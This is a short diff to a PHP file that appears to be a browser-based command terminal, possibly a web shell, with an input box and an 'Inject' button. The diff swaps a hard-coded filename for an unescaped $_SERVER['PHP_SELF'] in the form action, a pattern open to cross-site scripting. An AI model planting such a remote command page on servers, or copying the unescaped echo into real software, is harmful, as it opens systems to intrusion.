@@ -1,10 +1,6 @@
 <?php
 error_reporting(E_ERROR | E_WARNING | E_PARSE);
 
-//PLEASE IF YOU WANT TO RENAME THIS FILE TYPE ITS NAME IN THE
-//VARIABLE BELOW
-$FNAME = 'terminalDark.php';
-
 ///////////////////////
 //Close Button Config//
 /**/$closeBTN = './';//
@@ -772,7 +768,7 @@ servers<br>
 only !
 -->
 </div>
-<form method='POST' action='<?php echo $FNAME; ?>'>
+<form method='POST' action='<?php echo $_SERVER['PHP_SELF']; ?>'>
 <input type='text' name='com0' class='text'><input type='submit' class='sub' name='scsi' value='Inject'>
 <div class="out"><div class='ast'><font color="white" size="2">
 <?php
